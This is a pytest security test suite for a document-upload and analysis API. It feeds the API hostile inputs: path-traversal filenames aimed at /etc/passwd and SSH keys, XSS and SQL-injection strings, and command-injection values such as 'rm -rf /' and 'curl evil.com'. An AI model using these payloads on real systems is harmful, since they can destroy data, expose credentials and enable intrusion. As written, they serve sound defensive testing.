"""Security-focused tests for CaseStar API."""
import pytest
from unittest.mock import patch, Mock
import io

@pytest.mark.security
class TestFileUploadSecurity:
    """Test security of file upload endpoint."""
    
    def test_file_size_limit_enforcement(self, client, oversized_file):
        """Test that oversized files are rejected."""
        with open(oversized_file, 'rb') as f:
            response = client.post(
                "/api/upload",
                files={"file": ("large.txt", f, "text/plain")}
            )
        assert response.status_code == 413
        assert "too large" in response.json()["detail"].lower()
    
    def test_invalid_extension_rejected(self, client):
        """Test that files with invalid extensions are rejected."""
        fake_file = io.BytesIO(b"malicious content")
        response = client.post(
            "/api/upload",
            files={"file": ("malware.exe", fake_file, "application/x-msdownload")}
        )
        assert response.status_code == 400
        assert "supported" in response.json()["detail"].lower()
    
    def test_path_traversal_prevention(self, client):
        """Test that path traversal attacks are prevented."""
        fake_file = io.BytesIO(b"test content")
        malicious_filenames = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config",
            "../../.ssh/id_rsa",
        ]
        
        for filename in malicious_filenames:
            response = client.post(
                "/api/upload",
                files={"file": (filename + ".txt", fake_file, "text/plain")}
            )
            # Should either reject or sanitize the filename
            assert response.status_code in [200, 400]
            if response.status_code == 200:
                # Ensure filename was sanitized
                assert ".." not in response.json().get("filename", "")
    
    def test_null_byte_injection_prevention(self, client):
        """Test that null byte injection is handled."""
        fake_file = io.BytesIO(b"test content")
        response = client.post(
            "/api/upload",
            files={"file": ("file.txt\x00.exe", fake_file, "text/plain")}
        )
        # Should either reject or sanitize
        assert response.status_code in [200, 400]
    
    def test_double_extension_handling(self, client):
        """Test handling of double extensions."""
        fake_file = io.BytesIO(b"test content")
        response = client.post(
            "/api/upload",
            files={"file": ("malware.exe.txt", fake_file, "text/plain")}
        )
        # Should accept .txt extension
        assert response.status_code == 200
    
    def test_mime_type_spoofing_detection(self, client):
        """Test that MIME type spoofing is detected."""
        # Send executable content with text MIME type
        fake_file = io.BytesIO(b"MZ\x90\x00")  # PE executable signature
        response = client.post(
            "/api/upload",
            files={"file": ("file.txt", fake_file, "text/plain")}
        )
        # Should either detect or process safely
        assert response.status_code in [200, 400]


@pytest.mark.security
class TestInputValidation:
    """Test input validation and sanitization."""
    
    @patch('main.llm')
    @patch('main.collection')
    def test_xss_in_document_text(self, mock_collection, mock_llm, client):
        """Test that XSS attempts in document text are handled."""
        mock_llm.invoke.return_value = '{"summary": "test", "key_points": [], "entities": []}'
        
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "onclick='alert(1)'",
        ]
        
        for payload in xss_payloads:
            response = client.post(
                "/api/analyze",
                json={"text": f"Document with {payload} injection"}
            )
            # Should sanitize or reject
            assert response.status_code in [200, 400, 422]
    
    @patch('main.llm')
    def test_sql_injection_in_case_id(self, mock_llm, client):
        """Test that SQL injection attempts in case_id are handled."""
        mock_llm.invoke.return_value = '{"summary": "test", "key_points": [], "entities": []}'
        
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE cases;--",
            "1' UNION SELECT * FROM users--",
        ]
        
        for payload in sql_payloads:
            response = client.post(
                "/api/analyze",
                json={"text": "Test document", "case_id": payload}
            )
            # Should handle safely
            assert response.status_code in [200, 400, 422]
    
    @patch('main.llm')
    def test_command_injection_prevention(self, mock_llm, client):
        """Test that command injection is prevented."""
        mock_llm.invoke.return_value = '{"summary": "test", "key_points": [], "entities": []}'
        
        command_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& curl evil.com",
            "`whoami`",
        ]
        
        for payload in command_payloads:
            response = client.post(
                "/api/analyze",
                json={"text": f"Document with {payload} content"}
            )
            # Should sanitize or process safely
            assert response.status_code in [200, 400, 422]
    
    def test_text_length_limit_enforcement(self, client):
        """Test that extremely long text is rejected."""
        # Create text longer than MAX_TEXT_LENGTH
        long_text = "A" * 100001
        response = client.post(
            "/api/analyze",
            json={"text": long_text}
        )
        assert response.status_code == 422  # Validation error
    
    def test_empty_text_rejection(self, client):
        """Test that empty text is rejected."""
        response = client.post(
            "/api/analyze",
            json={"text": ""}
        )
        assert response.status_code == 422
        
        response = client.post(
            "/api/analyze",
            json={"text": "   "}  # Whitespace only
        )
        assert response.status_code == 422


@pytest.mark.security
class TestDataSecurity:
    """Test data security measures."""
    
    @patch('main.llm')
    @patch('main.collection')
    def test_secure_id_generation(self, mock_collection, mock_llm, client):
        """Test that document IDs are generated securely."""
        mock_llm.invoke.return_value = '{"summary": "test", "key_points": [], "entities": []}'
        mock_collection.add = Mock()
        
        response = client.post(
            "/api/analyze",
            json={"text": "Test document", "case_id": "test-case"}
        )
        
        if response.status_code == 200:
            # Verify that add was called with a secure ID
            if mock_collection.add.called:
                call_args = mock_collection.add.call_args
                doc_id = call_args[1]['ids'][0]
                # Should not be predictable (not based on text length)
                assert "test-case" in doc_id
                assert len(doc_id) > len("test-case")  # Should have UUID component
    
    def test_sensitive_data_not_in_errors(self, client):
        """Test that sensitive data is not exposed in error messages."""
        response = client.post(
            "/api/analyze",
            json={"text": "test", "case_id": "SECRET-123-CONFIDENTIAL"}
        )
        # Error messages should not contain the case ID
        if response.status_code >= 400:
            error_detail = str(response.json().get("detail", ""))
            assert "SECRET-123-CONFIDENTIAL" not in error_detail


@pytest.mark.security
class TestAPIEndpointSecurity:
    """Test API endpoint security."""
    
    def test_cors_headers_present(self, client):
        """Test that CORS headers are properly configured."""
        response = client.options("/api/upload")
        # CORS should be configured
        # Note: TestClient may not fully simulate CORS
        assert response.status_code in [200, 405]
    
    def test_health_endpoint_no_sensitive_data(self, client):
        """Test that health endpoint doesn't leak sensitive data."""
        response = client.get("/health")
        assert response.status_code == 200
        data = response.json()
        
        # Should not contain passwords, keys, or connection strings
        response_str = str(data).lower()
        sensitive_keywords = ["password", "secret", "key", "token", "connectionstring"]
        for keyword in sensitive_keywords:
            assert keyword not in response_str
    
    def test_invalid_content_type_handling(self, client):
        """Test handling of invalid content types."""
        response = client.post(
            "/api/analyze",
            data="not json",
            headers={"Content-Type": "text/plain"}
        )
        assert response.status_code == 422
    
    def test_malformed_json_handling(self, client):
        """Test handling of malformed JSON."""
        response = client.post(
            "/api/analyze",
            data="{invalid json}",
            headers={"Content-Type": "application/json"}
        )
        assert response.status_code == 422


@pytest.mark.security
class TestFileContentSecurity:
    """Test security of file content processing."""
    
    @patch('main.collection')
    def test_pdf_with_embedded_script(self, mock_collection, client, sample_pdf_file):
        """Test handling of PDFs with embedded scripts."""
        with open(sample_pdf_file, 'rb') as f:
            response = client.post(
                "/api/upload",
                files={"file": ("test.pdf", f, "application/pdf")}
            )
        # Should process safely without executing scripts
        assert response.status_code in [200, 500]  # May fail to extract text, but shouldn't crash
    
    def test_text_file_with_unicode_exploit(self, client):
        """Test handling of unicode-based exploits."""
        # Right-to-left override character exploit
        unicode_exploit = "file\u202e.txt\u202d.exe"
        fake_file = io.BytesIO("test content".encode('utf-8'))
        
        response = client.post(
            "/api/upload",
            files={"file": (unicode_exploit, fake_file, "text/plain")}
        )
        # Should sanitize unicode characters
        assert response.status_code in [200, 400]
    
    def test_metadata_injection_in_filename(self, client):
        """Test that metadata injection via filename is prevented."""
        malicious_names = [
            "test'; DROP TABLE files;--.txt",
            "test<script>alert(1)</script>.txt",
            "../../../etc/passwd.txt",
        ]
        
        fake_file = io.BytesIO(b"test content")
        for name in malicious_names:
            response = client.post(
                "/api/upload",
                files={"file": (name, fake_file, "text/plain")}
            )
            assert response.status_code in [200, 400]


@pytest.mark.security
class TestErrorHandling:
    """Test security of error handling."""
    
    def test_no_stack_traces_in_production_errors(self, client):
        """Test that stack traces are not exposed in error responses."""
        # Try to trigger an error
        response = client.post(
            "/api/analyze",
            json={"invalid": "data"}
        )
        
        if response.status_code >= 400:
            error_response = response.json()
            error_str = str(error_response).lower()
            
            # Should not contain stack trace indicators
            stack_indicators = ["traceback", "line ", "file \"", ".py\"", "exception:"]
            for indicator in stack_indicators:
                assert indicator not in error_str
    
    def test_generic_error_messages(self, client):
        """Test that error messages don't reveal system details."""
        response = client.get("/nonexistent-endpoint")
        
        if response.status_code == 404:
            error = response.json()
            error_str = str(error).lower()
            
            # Should not reveal system paths or internal details
            sensitive_info = ["c:\\", "/home/", "/usr/", "windows", "system32"]
            for info in sensitive_info:
                assert info not in error_str
